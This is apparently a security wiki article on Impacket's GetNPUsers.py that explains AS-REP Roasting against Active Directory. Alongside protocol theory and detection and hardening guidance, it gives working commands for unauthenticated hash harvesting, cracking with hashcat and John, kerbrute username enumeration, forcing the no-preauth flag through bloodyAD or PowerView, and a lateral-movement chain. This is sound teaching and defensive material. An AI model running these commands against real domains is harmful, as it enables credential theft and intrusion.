
title: "GetNPUsers.py"
script: "examples/GetNPUsers.py"
category: "Recon and Enumeration"
status: "Published"
protocols:
  - Kerberos
  - LDAP
  - MS-KILE
ms_specs:
  - MS-KILE
  - MS-ADTS
  - RFC 4120
  - RFC 4757
  - RFC 6113
mitre_techniques:
  - T1558.004
  - T1087.002
  - T1003
auth_types:
  - unauthenticated
  - password
  - nt_hash
  - aes_key
  - kerberos_ccache
tags:
  - impacket
  - impacket/examples
  - category/recon_and_enumeration
  - status/published
  - protocol/kerberos
  - protocol/ldap
  - authentication/none
  - authentication/kerberos
  - authentication/ntlm
  - technique/asrep_roasting
  - technique/credential_access
  - technique/offline_cracking
  - mitre/T1558/004
  - mitre/T1087/002
  - mitre/T1003
aliases:
  - GetNPUsers
  - impacket-GetNPUsers
  - asreproast
  - as_rep_roasting


# GetNPUsers.py

> **One line summary:** Identifies user accounts that have Kerberos preauthentication disabled, sends an `AS-REQ` to the KDC for each one, and harvests the resulting `AS-REP` material in a format ready for offline password cracking, all without needing any valid domain credential.

| Field | Value |
|:---|:---|
| Script | `examples/GetNPUsers.py` |
| Category | Recon and Enumeration |
| Status | Published |
| Primary protocols | Kerberos, LDAP |
| Primary Microsoft specifications | `[MS-KILE]`, `[MS-ADTS]`, RFC 4120, RFC 4757, RFC 6113 |
| MITRE ATT&CK techniques | T1558.004 AS-REP Roasting, T1087.002 Domain Account Discovery, T1003 OS Credential Dumping |
| Authentication types supported | Unauthenticated (with `-usersfile`), password, NT hash, AES key, Kerberos ccache |
| First appearance in Impacket | 2017 |
| Original authors | Alberto Solino (`@agsolino`), based on the AS-REP Roasting technique popularized by Will Schroeder (`@harmj0y`) |



## Prerequisites

This article assumes you have already read:

- [`00_Introduction_and_Architecture.md`](Introduction_and_Architecture.md) for the Impacket stack.
- [`samrdump.py`](samrdump.md) for the `UserAccountControl` flag table. The flag this article hinges on, `DONT_REQUIRE_PREAUTH` (`0x400000`), appears in that table.
- [`GetUserSPNs.py`](GetUserSPNs.md) for the Kerberos foundations: the cast of characters (Client, KDC, Service), the three exchanges (AS, TGS, AP), encryption types (RC4, AES128, AES256), and how long term keys are derived from passwords. **This article does not re explain any of that material.**

If you skipped the Kerberos theory section in [`GetUserSPNs.py`](GetUserSPNs.md), go back and read it now. Section four of that article carries this one.



## What it does

`GetNPUsers.py` performs **AS-REP Roasting**, which is the second of the two great Kerberos password recovery attacks (the first being Kerberoasting through [`GetUserSPNs.py`](GetUserSPNs.md)). The tool runs in two stages.

**Stage one is target discovery.** When given a valid credential, the tool authenticates to a domain controller via LDAP and queries for user accounts whose `userAccountControl` attribute has the `DONT_REQUIRE_PREAUTH` bit set (`0x400000`, decimal 4194304). When given a `-usersfile` instead, the tool simply iterates through the supplied list of usernames. With no credential and no usersfile, the tool falls back to attempting an RPC null session against the SAMR interface to enumerate users, which usually fails on modern Windows but is occasionally productive against legacy or Samba targets.

**Stage two is AS-REP harvesting.** For each candidate user, the tool sends an `AS-REQ` to the KDC asking for a Ticket Granting Ticket but deliberately omitting the preauthentication data. If the targeted account has preauthentication disabled, the KDC happily responds with an `AS-REP` whose encrypted portion is decryptable with the user's long term key. The tool extracts that ciphertext and formats it as a `$krb5asrep$23$...` string suitable for hashcat or John the Ripper.

The cracked output is the user's plaintext password, which can then be used directly or paired with [`getTGT.py`](../02_kerberos_attacks/getTGT.md) to obtain a TGT for follow on activity.

The single most important property of this attack is what it does **not** require:

- No valid credential is needed if you have any list of candidate usernames.
- No special privileges are needed even when authenticated.
- No interaction with the target account itself happens at any point.
- No lockout policy applies, because all cracking is offline.
- The KDC will respond willingly to an unauthenticated request because that is what disabled preauthentication means.

For a security researcher this is one of the most dangerous discoveries: a single account in a domain configured with `DONT_REQUIRE_PREAUTH` and a weak password hands over a credential to anyone with network access to the KDC.



## Why it exists

Kerberos preauthentication was added to the protocol in the mid 1990s as a defense against offline password attacks. Before preauthentication, anyone could send an `AS-REQ` for any user and receive an `AS-REP` containing material encrypted with that user's key. The encrypted material was crackable offline. Microsoft enabled preauthentication by default in Active Directory, and the offline attack was supposed to be solved.

Then administrators discovered they could disable preauthentication on a per account basis. The `UserAccountControl` flag `DONT_REQUIRE_PREAUTH` exists for exactly that purpose. Reasons it gets set on real accounts include:

- **Legacy Unix Kerberos clients** that did not implement preauthentication and could not authenticate to Active Directory without the flag being disabled. This was a real concern in mid 2000s integrations between AD and MIT Kerberos environments.
- **Specific application requirements**, particularly older Java applications using the JGSS library or older versions of certain network appliances. Vendor documentation occasionally still recommends disabling preauthentication for compatibility.
- **Misconfiguration.** An administrator clicks the wrong checkbox in Active Directory Users and Computers. Service accounts get the flag because someone copied a template account that had it set.
- **Deliberate downgrade.** An attacker with sufficient permissions on an account (`GenericAll`, `GenericWrite`, or specific UAC writeback rights) can set the flag intentionally to make the account roastable, then roast it. This is documented as the "force AS-REP Roasting" technique and is part of many BloodHound attack paths.

The technique of exploiting these accounts was named and popularized by **Will Schroeder** (`@harmj0y`) around 2017, and his PowerShell tool `Get-ASREPHash` (later wrapped into `Rubeus` by Will Schroeder and Lee Christensen) was the first widely used implementation. Alberto Solino added the Python equivalent to Impacket as `GetNPUsers.py` shortly after, with the additional ability to run completely unauthenticated when given a usersfile.

The attack remains productive in 2026 because the configuration anti pattern that creates it has not gone away. Legacy compatibility requirements persist. Templates carry the flag forward. Misconfigurations happen. And the deliberate downgrade path through `GenericWrite` style permissions is a staple of intra domain privilege escalation.



## The protocol theory

The Kerberos foundations from [`GetUserSPNs.py`](GetUserSPNs.md) are not repeated here. What follows is the specific material that AS-REP Roasting depends on, focused tightly on the AS exchange and on what preauthentication actually does.

### The AS exchange in detail

When a Kerberos client wants to obtain a Ticket Granting Ticket, it sends an `AS-REQ` (Authentication Service Request) to the KDC. In the normal, preauthentication enabled flow, the request looks like this:

1. Client constructs an `AS-REQ` containing its user principal name, the service principal name `krbtgt/<REALM>` (because what it wants is a TGT), a list of supported encryption types, and a **`PA-ENC-TIMESTAMP`** preauthentication structure.
2. The `PA-ENC-TIMESTAMP` is the current timestamp, encrypted with the client's long term key (derived from the user's password).
3. The KDC receives the request, finds the user's long term key in the directory database, and attempts to decrypt the timestamp.
4. If decryption succeeds and the timestamp is within the allowed clock skew (default five minutes), the KDC accepts the request and issues an `AS-REP` containing the TGT plus a session key for use with the TGS.

The point of the encrypted timestamp is that it proves the client knows the password, **before the KDC sends back any material that could be cracked offline**. If decryption fails, the KDC responds with `KDC_ERR_PREAUTH_FAILED` and never issues the `AS-REP`. No crackable material leaves the KDC.

### What preauthentication prevents

Without preauthentication, the flow is simpler:

1. Client constructs an `AS-REQ` with no preauthentication data.
2. KDC receives the request and immediately issues an `AS-REP` containing the TGT plus a session key.
3. Part of the `AS-REP` is encrypted with the user's long term key.

That last step is the problem. The `AS-REP` contains an `enc-part` field whose content is encrypted with the user's password derived key. Anyone who captures that `AS-REP` can attempt to crack the password offline. Preauthentication prevents that capture by requiring proof of password knowledge **before** the encrypted material is ever generated.

When `DONT_REQUIRE_PREAUTH` is set on an account, the KDC skips the timestamp validation step. It will issue an `AS-REP` to anyone who asks. The encrypted material in that `AS-REP` is then in the attacker's hands.

### The DONT_REQUIRE_PREAUTH flag

The flag is one bit in the 32 bit `UserAccountControl` integer attribute on every Active Directory user object. Its value is `0x400000` (decimal 4194304). The full UAC flag table is in [`samrdump.py`](samrdump.md#useraccountcontrol-flags).

LDAP filters can identify accounts with this flag using the bitwise comparison operator `1.2.840.113556.1.4.803`:

```text
(userAccountControl:1.2.840.113556.1.4.803:=4194304)
```

Combined with the standard "not disabled" filter:

```text
(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))
```

This is what `GetNPUsers.py` sends to the DC during the discovery stage when authenticated.

In `samrdump.py` output, an account with `DONT_REQUIRE_PREAUTH` shows up with a UAC value that includes `0x400000`. Common combined values include `0x410200` (normal account, password never expires, no preauth), `0x420200` (normal account, password not required, no preauth), and so on. The presence of `0x400000` in the bitwise OR of the value is the signal.

### The AS-REP Roasting attack end to end

With the AS exchange clear, the attack reduces to four steps.

1. **Identify a target user.** Either by enumerating accounts with `DONT_REQUIRE_PREAUTH` via LDAP (requires a credential), or by guessing usernames from a wordlist (no credential needed).
2. **Send an `AS-REQ` without preauthentication data.** The request asks for a TGT bound to `krbtgt/<REALM>` for the target user.
3. **Receive the `AS-REP`.** If the target has `DONT_REQUIRE_PREAUTH`, the KDC responds. If not, the KDC responds with `KDC_ERR_PREAUTH_REQUIRED` and the attempt is wasted but not damaging.
4. **Extract and crack the encrypted material.** The `enc-part` field of the `AS-REP` contains material encrypted with the user's long term key. Format it as a `$krb5asrep$...` string and feed it to hashcat with mode 18200.

Steps 2 and 3 produce visible artifacts on the KDC, which becomes important in the detection section.

### Why this is worse than Kerberoasting

Both attacks recover plaintext passwords from Kerberos exchanges. The differences favor AS-REP Roasting from the attacker's perspective:

| Property | Kerberoasting | AS-REP Roasting |
|:---|:---||
| Credential needed | Yes (any valid domain user) | No (with `-usersfile`) |
| Target population | All accounts with SPNs | Only accounts with `DONT_REQUIRE_PREAUTH` |
| Typical target population size | Tens to hundreds | Often single digits |
| Encryption types | Whatever the SPN account supports | Whatever the target user supports |
| Hashcat mode | 13100 / 19600 / 19700 | 18200 (RC4 only) |
| Detection event | 4769 | 4768 |
| Online prerequisite | LDAP search + TGS-REQ | TGT-REQ only |

The smaller target population is the main catch. In most domains, very few accounts have `DONT_REQUIRE_PREAUTH` set. Where Kerberoasting reliably yields dozens of cracking targets, AS-REP Roasting often yields one or two. But when it yields one and the password is weak, the attacker holds a credential they obtained without ever authenticating.

### The encrypted blob

The `enc-part` of an `AS-REP` is structured according to RFC 4120. For the RC4-HMAC encryption type (etype 23, value `0x17`), Impacket extracts the cipher field of the `EncASRepPart` and formats it as:

```text
$krb5asrep$23$<sAMAccountName>@<REALM>$<first 16 hex bytes>$<remaining hex bytes>
```

The split between the first 16 bytes and the rest is a hashcat formatting convention. The first 16 bytes are the HMAC checksum prefix; the remainder is the actual ciphertext. Hashcat mode 18200 understands this layout.

For AES encryption types, the format is similar but uses different byte offsets and a different hashcat mode (which has not been standardized as widely). Most real world AS-REP Roasting still targets RC4 because the AES path is harder to crack and requires the target account to actively support AES.

The presence of the username in the format string is essential. Hashcat uses it to derive the key correctly during cracking. For AES, the username is part of the salt (per RFC 3962). For RC4, the username is part of the formatted output but does not affect the cryptographic operation.



## How the tool works internally

The script is short. It walks three potential paths to a target list and then does the same harvesting work on each.

1. **Argument parsing.** Standard Impacket target string plus AS-REP Roasting flags: `-request`, `-format`, `-outputfile`, `-usersfile`, `-no-pass`, `-hashes`, `-aesKey`, `-k`, `-dc-ip`, `-dc-host`, `-debug`, `-ts`.

2. **Credential resolution.** Same `parse_identity` flow as the other tools.

3. **Target list resolution.** Three branches:
    - **Branch A: usersfile provided.** Read the list and use it directly. No DC connection needed for discovery.
    - **Branch B: credentials provided, no usersfile.** Authenticate to LDAP and query the DC for accounts with the `DONT_REQUIRE_PREAUTH` flag.
    - **Branch C: no credentials, no usersfile.** Try an RPC null session against the SAMR interface (the same protocol covered in [`samrdump.py`](samrdump.md)) to enumerate users. Almost always fails on modern Windows. Listed for completeness.

4. **AS-REQ construction.** For each target, the tool builds a Kerberos `AS-REQ` PDU. The key step is what gets included in the `padata` field. For AS-REP Roasting, the only `padata` entry is a `PA-PAC-REQUEST` (asking the KDC to include the PAC in the resulting ticket). Crucially, no `PA-ENC-TIMESTAMP` is included. The absence of the timestamp is the entire trick.

5. **AS-REP parsing.** The tool sends the `AS-REQ` and waits for either an `AS-REP` (success, target has `DONT_REQUIRE_PREAUTH`) or a `KRB-ERROR` (failure). On success, the tool decodes the `AS-REP` using PyASN1 and extracts the `enc-part` cipher field.

6. **Format selection.** Based on the etype in the `AS-REP`, the tool produces a hashcat compatible string. The output is one line per successfully harvested target.

7. **Output.** Written to stdout and, if `-outputfile` was supplied, also to the specified file. Failed targets produce an info message to stderr noting that the target either does not have `DONT_REQUIRE_PREAUTH` or does not exist.

The tool is single threaded and processes one target at a time. For very large usersfiles this is slow but rarely a problem in practice because typical target lists are small.



## Authentication options

The unique property of `GetNPUsers.py` is that it can run **completely unauthenticated**. This is unusual among Impacket tools. The other authentication modes follow the same pattern as [`smbclient.py`](../05_smb_tools/smbclient.md).

### Unauthenticated with usersfile

```bash
GetNPUsers.py -no-pass -usersfile users.txt -dc-ip 10.0.0.10 \
  CORP.LOCAL/
```

Note the trailing slash with no username after the realm. The KDC does not verify the requesting user; the only identity that matters is the target user inside each `AS-REQ`. This is the mode that gets used when the attacker has reconnaissance information (perhaps from OSINT, a public LinkedIn page, or a previous data breach) but no domain credential.

### Authenticated discovery with cleartext password

```bash
GetNPUsers.py -request -outputfile hashes.asreproast \
  CORP.LOCAL/alice:'S3cret!' -dc-ip 10.0.0.10
```

When credentials are provided, the tool first runs the LDAP query, then requests the AS-REPs for the discovered targets in one combined operation.

### NT hash (pass the hash)

```bash
GetNPUsers.py -request -outputfile hashes.asreproast \
  -hashes :<nthash> CORP.LOCAL/alice -dc-ip 10.0.0.10
```

### AES key

```bash
GetNPUsers.py -request -outputfile hashes.asreproast \
  -aesKey <hex> CORP.LOCAL/alice -dc-ip 10.0.0.10
```

### Kerberos ccache

```bash
export KRB5CCNAME=/path/to/alice.ccache
GetNPUsers.py -request -outputfile hashes.asreproast \
  -k -no-pass CORP.LOCAL/alice -dc-ip 10.0.0.10
```



## Practical usage

### Pure unauthenticated harvest

```text
$ GetNPUsers.py -no-pass -usersfile users.txt -dc-ip 10.0.0.10 CORP.LOCAL/
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User alice doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User bob doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User charlie doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc_sql doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc_legacy@CORP.LOCAL:b80e9e3f13a25be3c47b95f9b40e0511$5b3c2a7f...e9fd1108
$krb5asrep$23$svc_unix@CORP.LOCAL:7d4f12a08e34cb95173fc9a0a8e4d3b6$8f2e94d1...c4a90e7b
[-] User test_account doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Two targets in the list responded with crackable material. The remainder properly require preauthentication and produced the harmless `KDC_ERR_PREAUTH_REQUIRED` rejection (which Impacket reports as the friendlier "doesn't have UF_DONT_REQUIRE_PREAUTH set" message).

### Authenticated discovery and harvest in one command

```bash
GetNPUsers.py -request -format hashcat -outputfile hashes.asreproast \
  CORP.LOCAL/alice:'S3cret!' -dc-ip 10.0.0.10
```

The tool queries the DC for `DONT_REQUIRE_PREAUTH` accounts, then requests an `AS-REP` for each. This is the typical mode when the attacker already has any low privilege credential.

### Discovery only, no harvesting

```bash
GetNPUsers.py CORP.LOCAL/alice:'S3cret!' -dc-ip 10.0.0.10
```

Without `-request`, the tool performs the LDAP query and lists matching accounts but does not send `AS-REQ` packets. Useful when you want to know the target list before generating the noisy KDC traffic of the harvest stage.

### Single user lookup

```bash
GetNPUsers.py -no-pass -dc-ip 10.0.0.10 CORP.LOCAL/svc_legacy
```

Provides a username directly in the target string. Equivalent to a one entry usersfile. Useful when prior reconnaissance has identified a specific candidate.

### Cracking the output

```bash
# RC4 (the only common case for AS-REP Roasting)
hashcat -m 18200 -a 0 hashes.asreproast rockyou.txt

# Show cracked results
hashcat -m 18200 --show hashes.asreproast
```

John the Ripper:

```bash
john --format=krb5asrep --wordlist=rockyou.txt hashes.asreproast
john --show --format=krb5asrep hashes.asreproast
```

### Output format selection

The default format is hashcat. For John use `-format john`:

```bash
GetNPUsers.py -no-pass -usersfile users.txt -dc-ip 10.0.0.10 \
  -format john -outputfile hashes.john CORP.LOCAL/
```

### Combining with username enumeration

If you do not have a usersfile, generate one. `kerbrute userenum` from the Ropnop project is the popular companion tool because it uses the same Kerberos `AS-REQ` based identity check that `GetNPUsers.py` uses internally:

```bash
kerbrute userenum -d CORP.LOCAL --dc 10.0.0.10 candidates.txt > validated.txt
GetNPUsers.py -no-pass -usersfile validated.txt -dc-ip 10.0.0.10 CORP.LOCAL/
```

`kerbrute` validates whether each candidate username exists in the realm. The output becomes the input for `GetNPUsers.py`. This pipeline lets an attacker go from a wordlist of likely usernames to a list of crackable hashes without ever authenticating.

### Forcing preauth disabled on a controlled account

If you have `GenericAll` or `GenericWrite` permissions on a target user (often discovered through BloodHound), you can flip the `DONT_REQUIRE_PREAUTH` flag yourself and then roast the account. Impacket does not include a built in tool for the flag flip, but PowerShell from a Windows context works:

```powershell
Set-DomainObject -Identity targetuser -XOR @{useraccountcontrol=4194304}
```

Or from Linux with `bloodyAD`:

```bash
bloodyAD -u alice -p 'S3cret!' -d corp.local --host 10.0.0.10 \
  add uac -f DONT_REQ_PREAUTH targetuser
```

Then run `GetNPUsers.py` as usual, including `targetuser` in the usersfile. After harvesting and (ideally) cracking, restore the flag so the target's UAC returns to normal.

### Key flags

| Flag | Meaning |
|:---|:---|
| `-request` | Actually request AS-REPs. Without this, only LDAP discovery happens. |
| `-usersfile <path>` | List of target usernames, one per line. Required for unauthenticated mode. |
| `-format <hashcat\|john>` | Output format. Default is hashcat. |
| `-outputfile <path>` | Write formatted hashes to file. |
| `-no-pass` | Skip password prompt. Required for unauthenticated mode and for `-k`. |
| `-hashes`, `-aesKey`, `-k` | Standard authentication flags. |
| `-dc-ip`, `-dc-host` | Explicit DC address. |
| `-debug`, `-ts` | Standard logging flags. |



## What it looks like on the wire

AS-REP Roasting traffic is simpler than Kerberoasting traffic because there is no TGS exchange and (in the unauthenticated case) no LDAP query.

### The AS exchange in capture

For each target, the tool sends one packet and receives one packet:

- **`AS-REQ`** to UDP or TCP port 88 on the KDC. The packet contains the target user principal name in `cname`, `krbtgt/<REALM>` in `sname`, and a `padata` field containing only `PA-PAC-REQUEST`. The `etype` list typically includes RC4-HMAC (`23`) preferentially.
- **`AS-REP`** in response, if the target has `DONT_REQUIRE_PREAUTH`. The packet contains the TGT plus the encrypted `enc-part` that becomes the crackable material.
- **`KRB-ERROR`** in response, if the target requires preauthentication. The error code is `KDC_ERR_PREAUTH_REQUIRED` (`0x19`).

### LDAP traffic, if authenticated

When the tool runs in authenticated discovery mode, it also produces:

- TCP connection to port 389 (or 636 for LDAPS) on the DC.
- LDAP bind, typically NTLM via SASL/GSS-SPNEGO unless `-k` was specified.
- LDAP `searchRequest` with the `(userAccountControl:1.2.840.113556.1.4.803:=4194304)` filter.
- LDAP `searchResEntry` messages with the matching account names.
- LDAP `unbindRequest`.

### Wireshark filters

```text
kerberos                             # all Kerberos traffic
kerberos.msg_type == 10              # AS-REQ
kerberos.msg_type == 11              # AS-REP
kerberos.error_code == 25            # KDC_ERR_PREAUTH_REQUIRED
kerberos.padata.type == 2            # PA-ENC-TIMESTAMP (absent in AS-REP roasting)
ldap.filter contains "4194304"
```

The complete absence of `kerberos.padata.type == 2` in an `AS-REQ` is the network signature of AS-REP Roasting. A normal Windows client always includes a `PA-ENC-TIMESTAMP` on its first `AS-REQ`. An attacker tool deliberately omits it.



## What it looks like in logs

The signature event for AS-REP Roasting is **Event ID 4768**, generated on every domain controller each time a TGT is issued. This is different from Kerberoasting, which generates 4769 events.

### Event ID 4768: Kerberos Authentication Service

Fields that matter for AS-REP Roasting detection:

| Field | Meaning |
|:---|:---|
| `TargetUserName` | The user the TGT was issued for. |
| `TicketEncryptionType` | `0x17` (RC4) is the AS-REP Roasting signal. |
| `PreAuthType` | **`0` is the AS-REP Roasting signal.** Normal authentication uses `2` (PA-ENC-TIMESTAMP) or `11` / `15` / `16` (smartcard variants). |
| `Status` | `0x0` for successful issuance. |
| `IpAddress` | Source IP of the requesting host. |
| `IpPort` | Source port. |
| `ClientUserName` | The principal making the request. For AS-REP Roasting this matches `TargetUserName`. |

The combination `EventID=4768`, `PreAuthType=0`, `Status=0x0`, `TicketEncryptionType=0x17` is a high fidelity AS-REP Roasting signature. Legitimate authentication produces 4768 events constantly, but the `PreAuthType=0` field separates the attack from normal traffic almost perfectly.

### Failed attempts

When `GetNPUsers.py` queries a target that does **not** have `DONT_REQUIRE_PREAUTH`, the KDC responds with `KDC_ERR_PREAUTH_REQUIRED`. This produces:

- **Event ID 4768** with `Status=0x18` (`KDC_ERR_PREAUTH_REQUIRED`).

A burst of 4768 events with status `0x18` from a single source IP is its own detectable pattern: it indicates a tool sweeping a list of accounts looking for the rare ones that respond. This may be a more reliable signal than the success case because the failed attempts vastly outnumber the successes.

### LDAP query traces

If the attacker is using the authenticated discovery mode, the LDAP query produces:

- **Event ID 4662** on the DC for the directory service object access, if "Audit Directory Service Access" is enabled and configured to capture the relevant attribute reads.

The specific LDAP filter `(userAccountControl:1.2.840.113556.1.4.803:=4194304)` does not show up in the standard event log. To capture it, defenders need either DC level network capture, a sysmon rule that watches LDAP traffic, or an EDR product that inspects LDAP query content.



## Detection and defense

### Detection opportunities

AS-REP Roasting is one of the easiest Active Directory attacks to detect at the KDC because the `PreAuthType=0` field is so unusual. The challenge is volume tuning, because misconfigured legitimate clients occasionally produce events that look similar.

**Filter 4768 events to the AS-REP Roasting signature.** A starting rule:

- Event ID is 4768.
- PreAuthType is `0`.
- Status is `0x0` (success) or `0x18` (preauth required failure).
- TicketEncryptionType is `0x17`.

The success case is the actual harvest. The `0x18` case is the sweep through users that lack the flag, which is itself diagnostic of the tool being run.

A starter Sigma style rule:

```yaml
title: AS-REP Roasting Activity
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4768
    PreAuthType: '0'
    TicketEncryptionType: '0x17'
  filter_known_legacy:
    TargetUserName:
      - 'svc_legitimate_legacy_app'
  condition: selection and not filter_known_legacy
level: high
```

The allowlist is essential. Maintain a curated list of accounts that are known to legitimately have preauthentication disabled, and exclude them from the rule. Any account not on the allowlist receiving an `AS-REQ` with no preauthentication data is an alert.

**Volume based detection on `KDC_ERR_PREAUTH_REQUIRED`.** A sweep across many users from a single source IP is anomalous. Counting 4768 events with status `0x18` per source IP per minute, with a threshold tuned to environment baseline, catches the discovery half of the attack even when the harvest yields nothing.

**LDAP query inspection.** If your monitoring stack can see LDAP query content, alert on the bitwise filter for `userAccountControl & 4194304`. Legitimate administrative tools rarely run that exact query.

**Honeypot accounts.** Create a user with `DONT_REQUIRE_PREAUTH` set, a long random password, and an alert rule that fires on any `AS-REQ` for that user. The account exists for no other purpose. Any `AS-REQ` against it is, by definition, hostile reconnaissance.

### Preventive controls

The hardening pyramid for AS-REP Roasting, from most impactful to least.

- **Audit and remove `DONT_REQUIRE_PREAUTH` from every account that does not absolutely require it.** This is the single most effective control. Run a one line PowerShell query in your environment regularly:

    ```powershell
    Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol
    ```

    For each result, verify whether the flag is still needed. For most environments the answer is no. Remove it.
- **Enforce strong passwords on accounts that must keep the flag set.** A 25 character random password is uncrackable with current technology even when the AS-REP material is harvested. If a legacy application requires preauthentication disabled, give the account a generated password rotated regularly.
- **Restrict who can modify the `userAccountControl` attribute.** The deliberate downgrade attack (flipping the flag on an account you have permissions over) is part of many AD attack paths. BloodHound output that shows `GenericWrite` or `GenericAll` paths to high privilege accounts should be treated as high priority remediation, not just because of preauthentication but because all of UAC is writable through those permissions.
- **Disable RC4 encryption type for accounts that must keep the flag set.** Setting `msDS-SupportedEncryptionTypes` to AES only forces the AS-REP encryption to AES, which is much harder to crack and lacks well established hashcat tooling. The trade off is potential compatibility issues with whatever required the flag in the first place.
- **Monitor with the detections above.** No prevention is perfect. The AS-REP Roasting signature is one of the cleanest detection opportunities in Active Directory. Use it.



## Related tools and attack chains

AS-REP Roasting is usually one move in a longer engagement. The surrounding tools are documented elsewhere in this wiki.

- **[`samrdump.py`](samrdump.md)** identifies which accounts have `DONT_REQUIRE_PREAUTH` set when a credential is in hand. The annotated output example in that article specifically calls out the `0x400000` bit. Run `samrdump.py` and look for any UAC value with the `0x400000` bit set.
- **[`lookupsid.py`](lookupsid.md)** provides a complementary username enumeration path when no credential is available. The output cannot tell you which accounts have `DONT_REQUIRE_PREAUTH`, but it gives you the username list to feed into `GetNPUsers.py -usersfile`.
- **[`GetUserSPNs.py`](GetUserSPNs.md)** is the companion attack, Kerberoasting. The two attacks are run together on virtually every engagement. Where Kerberoasting needs valid credentials and finds many targets, AS-REP Roasting finds fewer targets but needs no credentials. They complement each other.
- **[`getTGT.py`](../02_kerberos_attacks/getTGT.md)** is the next step once a cracked password is in hand. Cache a TGT for the cracked account and use it with any `-k` aware Impacket tool.
- **[`secretsdump.py`](../03_credential_access/secretsdump.md)** is what you run with the cracked credential if the account has administrative rights. Many AS-REP Roastable accounts are legacy service accounts that turn out to be over privileged.
- **[`psexec.py`](../04_remote_execution/psexec.md)**, **[`smbexec.py`](../04_remote_execution/smbexec.md)**, **[`wmiexec.py`](../04_remote_execution/wmiexec.md)** for lateral movement using the recovered credential.
- **[`findDelegation.py`](findDelegation.md)** for checking whether the recovered account has delegation configured. Legacy service accounts with `DONT_REQUIRE_PREAUTH` that also have `TRUSTED_FOR_DELEGATION` are a high value finding.

A canonical engagement workflow:

1. **No credential.** Build a candidate username list from OSINT, breach data, or `kerbrute userenum`.
2. **Run `GetNPUsers.py -no-pass`** against the candidate list. Often yields nothing, occasionally yields one or two crackable hashes.
3. **Crack offline** with hashcat mode 18200 against a wordlist.
4. **Pivot to authenticated reconnaissance** if a password cracks. With the new credential, run [`samrdump.py`](samrdump.md), [`GetUserSPNs.py`](GetUserSPNs.md), and BloodHound to map the environment.
5. **Use [`getTGT.py`](../02_kerberos_attacks/getTGT.md)** to cache a TGT for the cracked account.
6. **Lateral movement** with [`psexec.py`](../04_remote_execution/psexec.md) or peers as warranted.
7. **Privilege escalation** if the cracked account has rights worth exploiting.

The attack frequently fails because most domains have no roastable accounts. When it succeeds, the productivity is exceptional precisely because the entry cost was zero.



## Further reading

- **Will Schroeder (`@harmj0y`) "Roasting AS-REPs"** at `https://blog.harmj0y.net/activedirectory/roasting-as-reps/`. The original public writeup of the technique with the most accessible explanation of the underlying Kerberos behavior.
- **`[MS-KILE]`: Kerberos Protocol Extensions.** `https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/`. Section 3.3.5.6 covers preauthentication processing on the KDC.
- **RFC 4120.** Section 5.2.7 specifies the `padata` types including `PA-ENC-TIMESTAMP` (type `2`) and the optional nature of preauthentication.
- **RFC 6113.** Generalized framework for Kerberos preauthentication. Useful for understanding why the protocol allows preauthentication to be optional.
- **Sean Metcalf's "Cracking Kerberos TGTs and Service Tickets"** at `https://adsecurity.org/`. Complementary defensive perspective on both Kerberoasting and AS-REP Roasting.
- **MITRE ATT&CK T1558.004 AS-REP Roasting** at `https://attack.mitre.org/techniques/T1558/004/`.
- **The Hacker Recipes: AS-REP Roasting** at `https://www.thehacker.recipes/ad/movement/kerberos/asreproast`. Practical reference with multiple tool implementations.
- **Microsoft "Kerberos Pre-authentication: Why It Should Not Be Disabled"** documentation in older TechNet archives. The official Microsoft position on the flag.
- **CVE-2022-33679** at `https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-33679`. James Forshaw's encryption downgrade attack that achieves AS-REP Roasting like results against accounts that have RC4 enabled, even with preauthentication required. Effectively turns AS-REP Roasting into a universal attack against any RC4 capable account, though it is significantly more complex to execute.

Run `GetNPUsers.py` against your own lab. Then audit your production directory for accounts with `DONT_REQUIRE_PREAUTH` set. If any exist, ask why. The historical reasons that justified the flag are almost always obsolete in 2026, and removing the flag is one of the cheapest hardening wins available in Active Directory.
